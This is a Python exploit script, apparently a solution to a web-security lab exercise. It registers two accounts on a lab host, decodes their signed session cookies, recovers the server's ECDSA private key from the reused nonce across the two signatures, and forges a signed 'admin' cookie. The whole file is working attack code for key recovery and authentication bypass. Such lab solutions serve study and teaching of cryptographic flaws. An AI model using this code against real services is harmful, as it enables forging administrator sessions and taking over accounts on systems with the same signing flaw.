import base64
import requests
from ecdsa import SECP256k1, SigningKey, util
from hashlib import sha256
from urllib.parse import unquote

def decode_cookie(cookie):
    decoded_url = unquote(cookie)
    decoded_base64 = base64.b64decode(decoded_url).split(b'--')
    return decoded_base64

def recover_key(sig1, sig2, login1, login2):
    n_group = SECP256k1.order
    r1, s1 = util.sigdecode_der(sig1, n_group)
    r2, s2 = util.sigdecode_der(sig2, n_group)
    z1 = util.string_to_number(sha256(login1.encode()).digest())
    z2 = util.string_to_number(sha256(login2.encode()).digest())
    k = (z1 - z2) * pow((s1 - s2) % n_group, -1, n_group) % n_group
    dA = ((s1 * k - z1) * pow(r1, -1, n_group)) % n_group
    priv_key = SigningKey.from_secret_exponent(dA, curve=SECP256k1)
    return priv_key

def generate_admin_cookie(priv_key):
    message = b"admin"
    signature = priv_key.sign(message, hashfunc=sha256, sigencode=util.sigencode_der)
    print("\n Signature IS \n",signature)
    user = "admin"
    encoded_cookie = base64.b64encode(f"{user}--".encode() + signature).decode()
    return encoded_cookie

def register_user(session, username, password):
    url = "http://ptl-4d820a27-f133c7e3.libcurl.so/register"
    data = {
        "username": username,
        "password": password,
        "submit": "Submit"
    }
    response = session.post(url, data=data)
    if response.status_code == 200:
        cookies = session.cookies.get_dict()
        return cookies.get("secure")
    return None

def main():
    # Register users and get cookies
    session = requests.Session()
    cookie1 = register_user(session, "login123", "passwordA")
    print("\n Cookie for login45 is \n",cookie1)
    cookie2 = register_user(session, "login321", "passwordB")
    print("\n Cookie for login54 is \n",cookie2)

    if not cookie1 or not cookie2:
        print("Failed to register users or retrieve cookies.")
        return

    decoded_cookie1 = decode_cookie(cookie1)
    decoded_cookie2 = decode_cookie(cookie2)

    m1, sig1 = decoded_cookie1
    m2, sig2 = decoded_cookie2

    # Recover the private key from the signatures
    priv_key = recover_key(sig1, sig2, "login123", "login321")

    # Generate the admin cookie
    admin_cookie = generate_admin_cookie(priv_key)
    print(admin_cookie)



if __name__ == "__main__":
    main()
